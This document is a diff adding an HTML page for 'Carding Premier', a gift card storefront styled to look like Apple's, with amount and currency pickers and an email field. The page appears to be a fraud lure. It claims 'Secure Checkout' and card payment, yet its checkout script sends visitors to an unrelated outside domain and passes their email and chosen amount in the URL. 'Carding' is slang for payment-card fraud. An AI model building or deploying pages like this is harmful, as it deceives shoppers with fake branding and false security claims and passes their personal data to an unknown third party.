@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Carding Premier - Apple Gift Cards</title>
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,Helvetica,sans-serif;
+}
+body{
+background:#f5f5f7;
+color:#111;
+}
+header{
+background:#000;
+padding:18px 6%;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+.logo{
+color:white;
+font-size:30px;
+font-weight:bold;
+}
+.logo span{
+color:#35c759;
+}
+nav a{
+color:white;
+text-decoration:none;
+margin-left:20px;
+}
+.hero{
+padding:50px 6%;
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:30px;
+}
+.card{
+background:#fff;
+border-radius:18px;
+padding:35px;
+box-shadow:0 5px 25px rgba(0,0,0,.08);
+}
+.apple-wrap{
+text-align:center;
+}
+.apple-wrap h1{
+font-size:42px;
+margin:20px 0;
+}
+.apple-wrap p{
+color:#666;
+line-height:1.6;
+}
+.amount-grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:15px;
+}
+.amount{
+border:2px solid #ddd;
+border-radius:12px;
+padding:20px;
+text-align:center;
+cursor:pointer;
+font-size:22px;
+font-weight:bold;
+}
+.amount.active,
+.amount:hover{
+border-color:#35c759;
+background:#f1fff4;
+}
+.price{
+margin:25px 0;
+font-size:40px;
+font-weight:bold;
+color:#35c759;
+}
+.features{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin:15px 0 20px;
+gap:10px;
+}
+.feature{
+display:flex;
+align-items:center;
+gap:6px;
+font-size:13px;
+font-weight:bold;
+white-space:nowrap;
+}
+.feature-icon{
+width:22px;
+height:22px;
+border-radius:50%;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:14px;
+font-weight:bold;
+background:#1877f2;
+color:#fff;
+}
+input, select{
+width:100%;
+padding:15px;
+border-radius:12px;
+border:2px solid #ddd;
+font-size:16px;
+margin-bottom:15px;
+}
+.pay-btn{
+width:100%;
+background:#000;
+color:white;
+border:none;
+padding:20px;
+border-radius:12px;
+font-size:20px;
+font-weight:bold;
+cursor:pointer;
+}
+footer{
+background:#000;
+color:white;
+text-align:center;
+padding:30px;
+margin-top:40px;
+}
+@media(max-width:900px){
+.hero{
+grid-template-columns:1fr;
+}
+.features{
+flex-direction:column;
+align-items:flex-start;
+}
+}
+</style>
+</head>
+<body>
+<header>
+<div class="logo">CARDING <span>PREMIER</span></div>
+<nav>
+<a href="#">Home</a>
+<a href="#">Gift Cards</a>
+<a href="#">FAQ</a>
+<a href="#">Contact</a>
+</nav>
+</header>
+<section class="hero">
+<div class="card">
+<div class="apple-wrap">
+<svg width="180" height="180" viewBox="0 0 512 512">
+<path fill="#000" d="M349.6 179.2c-12.3 14.4-32.3 25.5-52.2 23.8-2.5-19.7 7.2-40.7 19.1-54.4 13.1-15.2 35.8-25.9 54.3-26.6 1.7 20.4-5.8 40.4-21.2 57.2z"/>
+</svg>
+<h1>Apple Gift Card</h1>
+<p>The perfect gift for everything Apple.<br>Apps, music, movies and more.</p>
+</div>
+</div>
+<div class="card">
+<h2>Select Amount</h2><br>
+<div class="amount-grid">
+<div class="amount active" data-price="10">$10</div>
+<div class="amount" data-price="25">$25</div>
+<div class="amount" data-price="50">$50</div>
+<div class="amount" data-price="100">$100</div>
+<div class="amount" data-price="200">$200</div>
+<div class="amount" data-price="500">$500</div>
+</div>
+<select id="currency">
+<option value="USD">USD ($)</option>
+<option value="GBP">GBP (£)</option>
+<option value="EUR">EUR (€)</option>
+<option value="AUD">AUD (A$)</option>
+</select>
+<div class="price" id="price">$10.00</div>
+<div class="features">
+<div class="feature"><div class="feature-icon">✓</div>Instant Delivery</div>
+<div class="feature"><div class="feature-icon">✓</div>Secure Checkout</div>
+<div class="feature"><div class="feature-icon">✓</div>24/7 Support</div>
+</div>
+<input id="email" type="email" placeholder="Enter delivery email">
+<button class="pay-btn" onclick="checkout()">💳 Pay Securely with Debit/Credit Card</button>
+</div>
+</section>
+<footer>© 2026 Carding Premier. All Rights Reserved.</footer>
+<script>
+const amounts = document.querySelectorAll(".amount");
+const price = document.getElementById("price");
+const currency = document.getElementById("currency");
+let selectedAmount = 10;
+const rates = {USD:1, GBP:0.79, EUR:0.92, AUD:1.52};
+const symbols = {USD:"$", GBP:"£", EUR:"€", AUD:"A$"};
+
+function updateDisplay(){
+    let symbol = symbols[currency.value];
+    let converted = selectedAmount * rates[currency.value];
+    price.textContent = symbol + converted.toFixed(2);
+}
+
+amounts.forEach(btn => {
+    btn.onclick = function(){
+        amounts.forEach(b => b.classList.remove("active"));
+        this.classList.add("active");
+        selectedAmount = Number(this.dataset.price);
+        updateDisplay();
+    }
+});
+
+currency.onchange = updateDisplay;
+
+function checkout(){
+    let email = document.getElementById("email").value;
+    let emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    
+    if(email === ""){
+        alert("Please enter your delivery email");
+        return;
+    }
+    if(!emailPattern.test(email)){
+        alert("Please enter a valid email address");
+        return;
+    }
+    
+    window.location.href = "https://myreferraldiscount.blog/?amount=" + selectedAmount + "&currency=" + currency.value + "&email=" + encodeURIComponent(email);
+}
+
+updateDisplay();
+</script>
+</body>
+</html>
